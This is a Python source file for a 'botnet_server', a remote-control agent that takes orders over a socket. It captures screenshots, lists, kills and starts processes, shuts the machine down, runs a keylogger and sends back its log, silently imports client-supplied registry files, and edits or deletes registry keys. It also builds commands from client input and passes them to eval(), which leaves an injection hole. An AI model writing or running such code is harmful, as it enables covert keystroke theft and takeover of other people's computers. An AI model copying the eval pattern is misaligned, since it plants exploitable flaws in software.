import socket
import pyautogui
import io
import os
import signal
import subprocess
from registry import registry
import time
import json
from utils import *

HOST = '127.0.0.1'  # The default server's hostname or IP
PORT = 26101  # The default port used by the server

class botnet_server:
#-------------------PRIVATE AREA-------------------
    def __init__(self, host = HOST, port = PORT):
        self.host = host # server host IP
        self.port = port # server port
        self.keylogger = None
    
    # parse output of powershell for easier to handle
    def __parse(self, line):
        tokens = [elem for elem in line.split(' ') if len(elem) > 0]
        res = []
        res.append(' '.join(tokens[:-2])) # process name
        res.append(tokens[-2]) # process id
        res.append(tokens[-1]) # thread count
        return res
    
    # check if process at pid is application (has GUI)
    def __isApp(self, pid):
        data = subprocess.check_output("powershell gps | where {$_.MainWindowTitle} | select Id")
        apps = str(data).split("\\r\\n")[3:-3]
        if (str(pid) not in apps): 
            raise Exception
    
    def __exec_cmd(self, cmd):
        '''try:
            eval(cmd)
            print("Executed", cmd, "successfully!")
            self.client.send(b"1")
        except:
            print("Failed to execute", cmd + "!")
            self.client.send(b"0")  '''
        eval(cmd)
        print("Executed", cmd, "successfully!")
        self.client.send(b"1")
            
#-------------------PUBLIC AREA-------------------
    def run_server(self):
        # create new socket to listen
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.host, self.port))
        print('Bind at IP:', self.host, 'port', self.port)
        self.server.listen()
        # accept connect
        self.client, self.addr = self.server.accept() # connection socket
        self.client = socket_adapter(self.client)
        print('Connected by', self.addr)
    
    def close_connect(self):
        try:
            self.client.close()
            print('Disconnected successful!')
        except:
            print('Disconnected failed!')
    
    def response_msg(self):
        request = self.client.recv().decode('utf-8')
        tokens = request.split(' ')
        cmd = tokens[0]
        func = ''
        if (cmd == 'QUIT'):
            self.close_connect()
        if (cmd == 'PIC'):
            func = "self.send_screenshot()"
        elif (cmd == 'PROC'):
            func = "self.send_list_process()"
        elif (cmd == 'KILLPROC'):
            pid = int(tokens[1])
            func = "self.kill_process({})".format(pid)
        elif (cmd == 'STARTPROC'):
            proc_name = ' '.join(tokens[1:])
            func = "self.start_process('{}')".format(proc_name)
        elif (cmd == 'APP'):
            func = "self.send_list_app()"
        elif (cmd == 'KILLAPP'):
            pid = int(tokens[1])
            func = "self.kill_app({})".format(pid)
        elif (cmd == 'STARTAPP'):
            app_name = ' '.join(tokens[1:])
            func = "self.start_app(\"{}\")".format(app_name)
        elif (cmd == 'SHUTDOWN'):
            func = "self.shutdown()"
        elif (cmd == 'HOOK'):
            func = "self.hook_key()"
        elif (cmd == 'UNHOOK'):
            func = "self.unhook_key()"
        elif (cmd == 'KEYLOG'):
            func = "self.send_key_log()"
        elif (cmd == "REGFILE"):
            func = "self.get_reg_text()"
        elif (cmd == "REGCMD"):
            tokens_reg = ' '.join(tokens[1:]).split('\\r\\n')
            tokens_reg[1] = tokens_reg[1].replace('\\', '\\\\') # format key path for past to function
            func = "self.exec_reg_cmd('{}', '{}', '{}', '{}', '{}')".format(*tokens_reg)
        if (func != ''):
            self.__exec_cmd(func)
        return (func != '')
    
    
    # send screenshot to client
    def send_screenshot(self):
        # take screenshot
        pic = pyautogui.screenshot()
        fd = io.BytesIO()
        pic.save(fd, "png")
        # send data
        data = fd.getvalue()
        self.client.send(data)
    
    # send list of process to client
    def send_list_process(self):
        # get list of process
        cmd = "powershell gps | select Name,Id,@{Name='ThreadCount';Expression={$_.Threads.Count}}"
        data = subprocess.check_output(cmd)
        procs = str(data).split("\\r\\n")[3:-3]
        procs = [self.__parse(proc) for proc in procs]
        json_procs = json.dumps(procs)
        self.client.send(json_procs.encode('utf-8'))
    
    # kill process by pid
    def kill_process(self, pid):
        os.kill(pid, signal.SIGTERM)
    
    # start process by name
    def start_process(self, proc_name):
        subprocess.Popen(proc_name)
    
    # send list of app to client
    def send_list_app(self):
        # get list of app
        cmd = "powershell gps | where {$_.MainWindowTitle} | \
            select Name,Id,@{Name='ThreadCount';Expression={$_.Threads.Count}}"
        data = subprocess.check_output(cmd)
        apps = str(data).split("\\r\\n")[3:-3]
        apps = [self.__parse(app) for app in apps]
        json_apps = json.dumps(apps)
        self.client.send(json_apps.encode('utf-8'))
    
    # kill app by pid
    def kill_app(self, pid):
        # check if process at pid is app, if not raise Exception else kill it
        self.__isApp(pid)
        os.kill(pid, signal.SIGTERM)
    
    # start app by name
    def start_app(self, app_name):
        subprocess.Popen(app_name)

    def shutdown(self):
        subprocess.Popen("shutdown /s")
    
    # start hook key
    def hook_key(self):
        if (self.keylogger == None):
            self.keylogger = subprocess.Popen(["python", "keylog.py"])
     
    # end hook key
    def unhook_key(self):
        self.keylogger.kill()
        self.keylogger = None
    
    # send key log to client
    def send_key_log(self):
        data = open("keylog.txt", "rb").read()
        self.client.send(data)
    
    # execute registry file from client
    def get_reg_text(self):
        data = self.client.recv()
        with open("abc.reg", "wb") as f:
            f.write(data)
        subprocess.run(["regedit.exe", "/s", "abc.reg"])
           
    # execute registry command from client
    def exec_reg_cmd(self, cmd_type, path, val_name, val, val_type):
        key = registry(path)
        if (cmd_type == "GETVAL"):
            ok = True
            try:
                data = key.get_value(val_name)
            except:
                data = 'junk'
                ok = False
            finally:
                self.client.send(data.encode('utf-8'))
                if (not ok):
                    raise RuntimeError
        elif (cmd_type == "SETVAL"):
            key.set_value(val_name, val_type, val)
        elif (cmd_type == "DELVAL"):
            key.delete_value(val_name)
        elif (cmd_type == "CREKEY"):
            key.create_key(val_name)
        elif (cmd_type == "DELKEY"):
            key.delete_key("")
        else:
            raise RuntimeError